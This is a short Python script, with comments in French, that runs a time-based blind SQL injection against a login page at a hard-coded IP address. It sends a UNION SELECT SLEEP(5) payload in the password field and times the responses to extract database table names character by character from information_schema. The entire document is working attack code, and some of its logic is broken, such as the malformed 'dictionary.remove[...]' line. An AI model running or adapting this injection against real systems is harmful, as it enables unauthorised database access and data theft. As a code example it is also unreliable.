import requests
import time

def table_name():
    dictionary = ["a","b","c","d","e","f","g","h","i","j","k","l","m","n","o","p","q","r","s","t","u","v","w","x","y","z","_"]
    a=0
    texte = ""
    TIME = 5
    url = "http://51.15.136.118/pageid.php"
    for i in range(1, 99):
        for j in range(0, len(dictionary)):
            usr = "idc"
            """faire la meme chose avec les ,1,2 qui change en fonction du nombre de tables"""
            passwd = "' UNION SELECT SLEEP(5),1,2 TABLE_NAME FROM information_schema.tables WHERE table_schema='nom_user_db' AND TABLE_NAME like '" + texte + dictionary[j] + "%' -- "
            print(passwd)
            start_time = time.time()
            response = requests.post(url, data={'username': usr, 'password': passwd})
            end_time = time.time()
            total_time = end_time - start_time
            """print(total_time)
            print(dictionary[j])"""
            a += 1
            print(a)
            if a > 27:
                """enlever """
                dictionary.remove[texte[1]]
            if total_time >= TIME:
                texte += dictionary[j]
                print(texte)
                i += 1
                j = 0
                a = 0
                break
    return(texte)

table_name()